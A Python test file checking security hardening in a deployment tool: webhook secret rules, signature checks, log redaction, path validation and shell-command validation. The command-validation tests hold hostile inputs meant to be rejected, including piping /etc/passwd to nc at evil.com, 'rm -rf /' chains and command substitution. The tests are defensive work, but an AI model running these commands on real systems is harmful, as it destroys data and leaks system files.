"""Phase 2 security hardening tests.

Cycle 1: Webhook secret required on startup
Cycle 2: Validate restore_command
Cycle 3: Harden exec health check commands
Cycle 4: Expand log redaction
Cycle 5: Tighten path validation
"""

import json
import os
from unittest.mock import patch

import pytest
from fastapi import HTTPException

from fraisier.dbops._validation import validate_file_path
from fraisier.status import DeploymentStatusFile

# ---------------------------------------------------------------------------
# Cycle 1: Webhook secret required on startup
# ---------------------------------------------------------------------------


class TestWebhookSecretRequired:
    """Webhook server must refuse to start without a valid secret."""

    def test_webhook_server_refuses_to_start_without_secret(self):
        from fraisier.webhook import _get_webhook_secret

        with (
            patch.dict(os.environ, {}, clear=True),
            patch("fraisier.webhook.get_config") as mock_config,
        ):
            mock_config.return_value.get_git_provider_config.return_value = {}
            with pytest.raises(
                RuntimeError, match="FRAISIER_WEBHOOK_SECRET must be set"
            ):
                _get_webhook_secret()

    def test_webhook_secret_rejects_too_short(self):
        from fraisier.webhook import _get_webhook_secret

        with (
            patch.dict(os.environ, {"FRAISIER_WEBHOOK_SECRET": "short"}),
            pytest.raises(RuntimeError, match="at least 32 characters"),
        ):
            _get_webhook_secret()

    def test_webhook_secret_accepts_valid(self):
        from fraisier.webhook import _get_webhook_secret

        secret = "a" * 32
        with patch.dict(os.environ, {"FRAISIER_WEBHOOK_SECRET": secret}):
            assert _get_webhook_secret() == secret


class TestCollectWebhookSecrets:
    """_collect_webhook_secrets gathers secrets from multiple sources."""

    def test_single_secret_from_env(self):
        from fraisier.webhook import _collect_webhook_secrets

        secret = "s" * 32
        with patch.dict(os.environ, {"FRAISIER_WEBHOOK_SECRET": secret}, clear=True):
            secrets = _collect_webhook_secrets()
        assert secrets == [secret]

    def test_per_env_secrets_collected(self):
        from fraisier.webhook import _collect_webhook_secrets

        env = {
            "FRAISIER_WEBHOOK_SECRET_DEVELOPMENT": "d" * 32,
            "FRAISIER_WEBHOOK_SECRET_STAGING": "s" * 32,
        }
        with patch.dict(os.environ, env, clear=True):
            secrets = _collect_webhook_secrets()
        expected = {
            env["FRAISIER_WEBHOOK_SECRET_DEVELOPMENT"],
            env["FRAISIER_WEBHOOK_SECRET_STAGING"],
        }
        assert set(secrets) == expected

    def test_combines_base_and_per_env(self):
        from fraisier.webhook import _collect_webhook_secrets

        env = {
            "FRAISIER_WEBHOOK_SECRET": "b" * 32,
            "FRAISIER_WEBHOOK_SECRET_STAGING": "s" * 32,
        }
        with patch.dict(os.environ, env, clear=True):
            secrets = _collect_webhook_secrets()
        assert "b" * 32 in secrets
        assert "s" * 32 in secrets
        assert len(secrets) == 2

    def test_skips_short_secrets_with_warning(self, caplog):
        from fraisier.webhook import _collect_webhook_secrets

        env = {
            "FRAISIER_WEBHOOK_SECRET": "short",
            "FRAISIER_WEBHOOK_SECRET_STAGING": "s" * 32,
        }
        with patch.dict(os.environ, env, clear=True):
            secrets = _collect_webhook_secrets()
        assert secrets == ["s" * 32]
        log = caplog.text.lower()
        assert "too short" in log or "32 characters" in log

    def test_empty_when_no_secrets(self):
        from fraisier.webhook import _collect_webhook_secrets

        with (
            patch.dict(os.environ, {}, clear=True),
            patch("fraisier.webhook.get_config") as mock_config,
        ):
            mock_config.return_value.get_git_provider_config.return_value = {}
            secrets = _collect_webhook_secrets()
        assert secrets == []

    def test_deduplicates_identical_secrets(self):
        from fraisier.webhook import _collect_webhook_secrets

        secret = "x" * 32
        env = {
            "FRAISIER_WEBHOOK_SECRET": secret,
            "FRAISIER_WEBHOOK_SECRET_DEV": secret,
        }
        with patch.dict(os.environ, env, clear=True):
            secrets = _collect_webhook_secrets()
        assert secrets == [secret]

    def test_fallback_to_config_file(self):
        from fraisier.webhook import _collect_webhook_secrets

        secret = "c" * 32
        with (
            patch.dict(os.environ, {}, clear=True),
            patch("fraisier.webhook.get_config") as mock_config,
        ):
            mock_config.return_value.get_git_provider_config.return_value = {
                "github": {"webhook_secret": secret}
            }
            secrets = _collect_webhook_secrets()
        assert secrets == [secret]


class TestMultiSecretSignatureVerification:
    """Webhook signature verification tries all configured secrets."""

    def test_accepts_webhook_signed_with_per_env_secret(self):
        """A webhook signed with a per-env secret should pass verification."""
        import hashlib
        import hmac as hmac_mod

        from fraisier.webhook import _verify_signature

        dev_secret = "d" * 32
        payload = json.dumps(
            {
                "ref": "refs/heads/main",
                "repository": {"full_name": "o/r"},
                "sender": {"login": "u"},
            }
        ).encode()
        sig = (
            "sha256="
            + hmac_mod.new(dev_secret.encode(), payload, hashlib.sha256).hexdigest()
        )

        env = {"FRAISIER_WEBHOOK_SECRET_DEVELOPMENT": dev_secret}
        with (
            patch.dict(os.environ, env, clear=True),
            patch("fraisier.webhook.get_config") as mock_config,
        ):
            mock_config.return_value.get_git_provider_config.return_value = {}

            provider, _ = _verify_signature(
                "github",
                payload,
                {
                    "x-hub-signature-256": sig,
                    "x-github-event": "push",
                },
            )
            assert provider is not None

    def test_rejects_webhook_with_unknown_secret(self):
        """A webhook signed with an unknown secret should be rejected."""
        import hashlib
        import hmac as hmac_mod

        from fraisier.webhook import _verify_signature

        unknown_secret = "u" * 32
        known_secret = "k" * 32
        payload = json.dumps({"ref": "refs/heads/main"}).encode()
        sig = (
            "sha256="
            + hmac_mod.new(unknown_secret.encode(), payload, hashlib.sha256).hexdigest()
        )

        env = {"FRAISIER_WEBHOOK_SECRET": known_secret}
        with (
            patch.dict(os.environ, env, clear=True),
            patch("fraisier.webhook.get_config") as mock_config,
        ):
            mock_config.return_value.get_git_provider_config.return_value = {}
            with pytest.raises(HTTPException) as exc_info:
                _verify_signature(
                    "github",
                    payload,
                    {
                        "x-hub-signature-256": sig,
                        "x-github-event": "push",
                    },
                )
            assert exc_info.value.status_code == 401


class TestMultiSecretTokenAuth:
    """Details endpoint accepts any configured secret as token."""

    def test_details_accepts_per_env_secret_as_token(self):
        from fastapi.testclient import TestClient

        from fraisier.webhook import app

        client = TestClient(app)
        staging_secret = "s" * 32
        status = DeploymentStatusFile(
            fraise_name="my_api",
            environment="staging",
            state="failed",
            error_message="something broke",
        )

        env = {"FRAISIER_WEBHOOK_SECRET_STAGING": staging_secret}
        with (
            patch("fraisier.webhook.read_status", return_value=status),
            patch.dict(os.environ, env, clear=True),
            patch("fraisier.webhook.get_config") as mock_config,
        ):
            mock_config.return_value.get_git_provider_config.return_value = {}
            response = client.get(
                "/api/status/my_api/details",
                headers={"X-Deployment-Token": staging_secret},
            )

        assert response.status_code == 200


# ---------------------------------------------------------------------------
# Cycle 2: Validate restore_command
# ---------------------------------------------------------------------------


class TestValidateShellCommand:
    """Shell commands from config must be validated."""

    def test_rejects_semicolon(self):
        from fraisier.dbops._validation import validate_shell_command

        with pytest.raises(ValueError, match="metacharacter"):
            validate_shell_command("pg_restore /tmp/x; rm -rf /")

    def test_rejects_pipe(self):
        from fraisier.dbops._validation import validate_shell_command

        with pytest.raises(ValueError, match="metacharacter"):
            validate_shell_command("cat /etc/passwd | nc evil.com 1234")

    def test_rejects_command_substitution(self):
        from fraisier.dbops._validation import validate_shell_command

        with pytest.raises(ValueError, match="metacharacter"):
            validate_shell_command("pg_restore $(whoami)")

    def test_rejects_backtick_substitution(self):
        from fraisier.dbops._validation import validate_shell_command

        with pytest.raises(ValueError, match="metacharacter"):
            validate_shell_command("pg_restore `whoami`")

    def test_rejects_double_ampersand(self):
        from fraisier.dbops._validation import validate_shell_command

        with pytest.raises(ValueError, match="metacharacter"):
            validate_shell_command("pg_restore /tmp/x && rm -rf /")

    def test_rejects_double_pipe(self):
        from fraisier.dbops._validation import validate_shell_command

        with pytest.raises(ValueError, match="metacharacter"):
            validate_shell_command("pg_restore /tmp/x || echo pwned")

    def test_accepts_valid_pg_restore(self):
        from fraisier.dbops._validation import validate_shell_command

        result = validate_shell_command(
            "pg_restore --dbname=mydb /var/backups/latest.dump"
        )
        assert result == [
            "pg_restore",
            "--dbname=mydb",
            "/var/backups/latest.dump",
        ]

    def test_accepts_valid_psql(self):
        from fraisier.dbops._validation import validate_shell_command

        result = validate_shell_command("psql -f /tmp/restore.sql mydb")
        assert result[0] == "psql"

    def test_rejects_when_allowlist_provided(self):
        from fraisier.dbops._validation import validate_shell_command

        with pytest.raises(ValueError, match="not in allowed"):
            validate_shell_command(
                "curl http://evil.com", allowed_binaries={"pg_restore", "psql"}
            )


# ---------------------------------------------------------------------------
# Cycle 3: Harden exec health check commands
# ---------------------------------------------------------------------------


class TestExecHealthCheckValidation:
    """Health check exec commands must be validated."""

    def test_exec_health_check_rejects_dangerous_commands(self):
        from fraisier.dbops._validation import validate_shell_command

        with pytest.raises(ValueError, match="metacharacter"):
            validate_shell_command("curl http://localhost:8000 && rm -rf /")


# ---------------------------------------------------------------------------
# Cycle 4: Expand log redaction
# ---------------------------------------------------------------------------


class TestLogRedaction:
    """Log redaction must cover all secret variants."""

    def test_redacts_webhook_secret(self):
        from fraisier.logging import ContextualLogger

        logger = ContextualLogger("test")
        data = {"webhook_secret": "s3cr3t", "name": "app"}
        redacted = logger._redact_dict(data)
        assert redacted["webhook_secret"] == "***REDACTED***"
        assert redacted["name"] == "app"

    def test_redacts_db_password(self):
        from fraisier.logging import ContextualLogger

        logger = ContextualLogger("test")
        data = {"db_password": "hunter2"}
        assert logger._redact_dict(data)["db_password"] == "***REDACTED***"

    def test_redacts_private_key(self):
        from fraisier.logging import ContextualLogger

        logger = ContextualLogger("test")
        data = {"private_key": "-----BEGIN RSA KEY-----"}
        assert logger._redact_dict(data)["private_key"] == "***REDACTED***"

    def test_redacts_api_token(self):
        from fraisier.logging import ContextualLogger

        logger = ContextualLogger("test")
        data = {"api_token": "ghp_xxxx"}
        assert logger._redact_dict(data)["api_token"] == "***REDACTED***"

    def test_redacts_ssh_key(self):
        from fraisier.logging import ContextualLogger

        logger = ContextualLogger("test")
        data = {"ssh_key": "/path/to/id_rsa"}
        assert logger._redact_dict(data)["ssh_key"] == "***REDACTED***"

    def test_does_not_redact_primary_key(self):
        from fraisier.logging import ContextualLogger

        logger = ContextualLogger("test")
        data = {"primary_key": "42"}
        assert logger._redact_dict(data)["primary_key"] == "42"


# ---------------------------------------------------------------------------
# Cycle 5: Tighten path validation
# ---------------------------------------------------------------------------


class TestPathValidation:
    """Path validation: symlinks must not escape base_dir."""

    def test_symlink_escape_rejected(self, tmp_path):
        base_dir = tmp_path / "safe"
        base_dir.mkdir()
        target = tmp_path / "unsafe" / "secrets.txt"
        target.parent.mkdir()
        target.write_text("secret data")

        link = base_dir / "escape"
        link.symlink_to(target)

        with pytest.raises(ValueError, match=r"[Ss]ymlink"):
            validate_file_path(str(link), base_dir=base_dir, strict=True)

    def test_docker_cp_rejects_relative_path(self):
        from fraisier.dbops._validation import validate_docker_cp_path

        with pytest.raises(ValueError, match="must start with /"):
            validate_docker_cp_path("mycontainer:relative/path")

    def test_docker_cp_accepts_absolute_path(self):
        from fraisier.dbops._validation import validate_docker_cp_path

        result = validate_docker_cp_path("mycontainer:/var/lib/data")
        assert result == "mycontainer:/var/lib/data"

    def test_strict_mode_rejects_any_symlink(self, tmp_path):
        base_dir = tmp_path / "safe"
        base_dir.mkdir()
        real = base_dir / "real.txt"
        real.write_text("data")
        link = base_dir / "link.txt"
        link.symlink_to(real)

        with pytest.raises(ValueError, match=r"[Ss]ymlink"):
            validate_file_path(str(link), base_dir=base_dir, strict=True)
